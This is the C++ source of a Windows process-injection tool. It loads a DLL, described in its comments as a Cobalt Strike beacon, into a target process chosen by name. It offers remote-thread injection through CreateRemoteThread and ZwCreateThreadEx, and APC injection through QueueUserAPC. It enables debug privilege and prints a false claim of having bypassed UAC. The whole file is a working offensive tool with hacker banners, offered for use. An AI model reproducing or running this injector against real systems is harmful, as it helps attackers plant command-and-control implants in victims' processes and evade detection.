#include<iostream>
#include<tchar.h>
#include <cstring>
#include<Windows.h>
#include<Tlhelp32.h>
#include <cctype> 
using namespace std;
#pragma comment(linker, "/section:.data,RWE")

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void APCInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE TargetHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (TargetHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	//2.远程申请内存
	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
	PVOID RemoteMemory = VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将上线的DLL的路径写入内存

	BOOL WriteStatus = WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}
	//4.获取LoadLibrary的函数地址
	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
	}
	//5.创建线程快照并且插入APC函数
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (SnapShot == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
	}
	//定义线程信息结构体,并且初始化
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);
	//然后就是遍历快照中的线程,进行插入
	int flag = 0;                  //判断APC是否插入成功
	HANDLE ThreadHandle = NULL;    //用于获取目标线程句柄
	if (Thread32First(SnapShot, &te))
	{
		//不想do while循环,所以我就直接先进行一次
		//判断目标线程的进程ID是否是我们要注入的进程的ID
		if (te.th32OwnerProcessID == pid)
		{
			ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
			if (ThreadHandle)
			{
				DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
				if (dwRet == TRUE)
				{
					flag++;
				}
			}
			ThreadHandle = NULL;  //清除句柄
		}

		while (Thread32Next(SnapShot, &te))  //遍历完毕就会停止
		{
			if (te.th32OwnerProcessID == pid)
			{
				ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				if (ThreadHandle)
				{
					DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
					if (dwRet == TRUE)
					{
						flag++;
					}
				}
				ThreadHandle = NULL;  //清除句柄
			}
		}
		CloseHandle(TargetHandle);
		CloseHandle(SnapShot);
		CloseHandle(ThreadHandle);
		if (flag == 0)
		{
			cout << "	[-] APC Inject Failed :(" << endl;
			return;
		}
		else
		{
			cout << "	[+] APC Inject Successfully :)" << endl;
		}
	}
}


void DLLInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE OriginalProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}
	//2.远程申请内存
	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);
	PVOID  RemoteMemory = VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将CS上线的DLL写入内存
	BOOL WriteStatus = WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	//4.获取LoadLibrary地址
	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	//5.声明ZwCreateThreadEx函数
#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	//6.获取NTDLL中ZwCreateThreadEx函数
	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}
	//5.创建线程 ring3调用CreateRemoteThread
	HANDLE RemoteHandle = CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
	if (RemoteHandle == NULL)
	{
		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
		return;

	}
	else {
		cout << "	[+] Ring3 Thread Inject Successfully :)" << endl;
	}

	//7.创建线程  ring0调用ZwCreateThreadEx
	HANDLE hRemoteThread;
	DWORD Status = 0;
	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
	if (Status == NULL)
	{
		cout << "	[+] Ring0 Thread Inject Successfully :)" << endl;
	}
	else
	{
		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
		return;
	}
	WaitForSingleObject(RemoteHandle, -1);
	//8.释放DLL空间
	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
	//9.关闭句柄
	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}


int _tmain(int argc, TCHAR* argv[])
{

	if (argc == 3) {

		cout << "	    Which kind of Injection do you want?" << endl;
		cout << "	    [1]: DLLInject" << endl << "	    [2]: APCInject" << endl;
		int type = 0;
		cin >> type;
		if (type == 1)
		{
			HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
			std::cout << "▓█████▄  ██▓     ██▓     ██▓ ███▄    █  ▄▄▄██▓▓▓▓█████  ▄████▄  ▄▄▄█████▓\n";
			std::cout << "▓██▓ ██▌▓██▓    ▓██▓    ▓██▓ ██ ▓█   █    ▓██   ▓█   ▓ ▓██▓ ▓█  ▓  ██▓ ▓▓\n";
			std::cout << "▓██   █▌▓██▓    ▓██▓    ▓██▓▓██  ▓█ ██▓   ▓██   ▓███   ▓▓█    ▄ ▓ ▓██▓ ▓▓\n";
			std::cout << "▓▓█▄   ▌▓██▓    ▓██▓    ▓██▓▓██▓  ▓▌██▓▓██▄██▓  ▓▓█  ▄ ▓▓▓▄ ▄██▓▓ ▓██▓ ▓ \n";
			std::cout << "▓▓████▓ ▓██████▓▓██████▓▓██▓▓██▓   ▓██▓ ▓███▓   ▓▓████▓▓ ▓███▓ ▓  ▓██▓ ▓ \n";
			std::cout << " ▓▓  ▓ ▓ ▓▓▓  ▓▓ ▓▓▓  ▓▓▓  ▓ ▓▓   ▓ ▓  ▓▓▓▓▓   ▓▓ ▓▓ ▓▓ ▓▓ ▓  ▓  ▓ ▓▓   \n";
			std::cout << " ▓▓  ▓ ▓ ▓ ▓  ▓▓ ▓ ▓  ▓ ▓ ▓▓ ▓▓   ▓ ▓▓ ▓ ▓▓▓    ▓ ▓  ▓  ▓  ▓       ▓    \n";
			std::cout << " ▓ ▓  ▓   ▓ ▓     ▓ ▓    ▓ ▓   ▓   ▓ ▓  ▓ ▓ ▓      ▓   ▓          ▓      \n";
			std::cout << "   ▓        ▓  ▓    ▓  ▓ ▓           ▓  ▓   ▓      ▓  ▓▓ ▓                \n";
			std::cout << " ▓                                                     ▓                    \n";
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			cout << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
			if (EnableDebugPrivilege() == TRUE)
			{

				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
			}
			else {
				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
			}
			DWORD PID = GetProcessPID(argv[1]);
			DLLInject(PID, argv[2]);


		}
		else if (type == 2)
		{
			DWORD PID = GetProcessPID(argv[1]);
			HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
			std::cout << " ▄▄▄       ██▓███   ▄████▄      ██▓ ███▄    █  ▄▄▄██▓▓▓▓█████  ▄████▄  ▄▄▄█████▓\n"
				"▓████▄    ▓██▓  ██▓▓██▓ ▓█     ▓██▓ ██ ▓█   █    ▓██   ▓█   ▓ ▓██▓ ▓█  ▓  ██▓ ▓▓\n"
				"▓██  ▓█▄  ▓██▓ ██▓▓▓▓█    ▄    ▓██▓▓██  ▓█ ██▓   ▓██   ▓███   ▓▓█    ▄ ▓ ▓██▓ ▓▓\n"
				"▓██▄▄▄▄██ ▓██▄█▓▓ ▓▓▓▓▄ ▄██▓   ▓██▓▓██▓  ▓▌██▓▓██▄██▓  ▓▓█  ▄ ▓▓▓▄ ▄██▓▓ ▓██▓ ▓ \n"
				" ▓█   ▓██▓▓██▓ ▓  ▓▓ ▓███▓ ▓   ▓██▓▓██▓   ▓██▓ ▓███▓   ▓▓████▓▓ ▓███▓ ▓  ▓██▓ ▓ \n"
				" ▓▓   ▓▓█▓▓▓▓▓ ▓  ▓▓ ▓▓ ▓  ▓   ▓▓  ▓ ▓▓   ▓ ▓  ▓▓▓▓▓   ▓▓ ▓▓ ▓▓ ▓▓ ▓  ▓  ▓ ▓▓   \n"
				"  ▓   ▓▓ ▓▓▓ ▓       ▓  ▓       ▓ ▓▓ ▓▓   ▓ ▓▓ ▓ ▓▓▓    ▓ ▓  ▓  ▓  ▓       ▓     \n"
				"  ▓   ▓   ▓▓       ▓            ▓ ▓   ▓   ▓ ▓  ▓ ▓ ▓      ▓   ▓          ▓      \n"
				"      ▓  ▓         ▓ ▓          ▓           ▓  ▓   ▓      ▓  ▓▓ ▓                \n"
				"                   ▓                                          ▓                   \n";

			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
			if (EnableDebugPrivilege() == TRUE)
			{

				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
			}
			else {
				cout << "-----------------------------!!START!!--------------------------------" << endl;
				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
			}
			APCInject(PID, argv[2]);

		}
		else {
			cout << "	    Please choose the number below :(" << endl;
			return 0;
		}

	}
	else
	{
		cout << "	[-] Two Parameters are required" << endl;
	}

	return 0;
}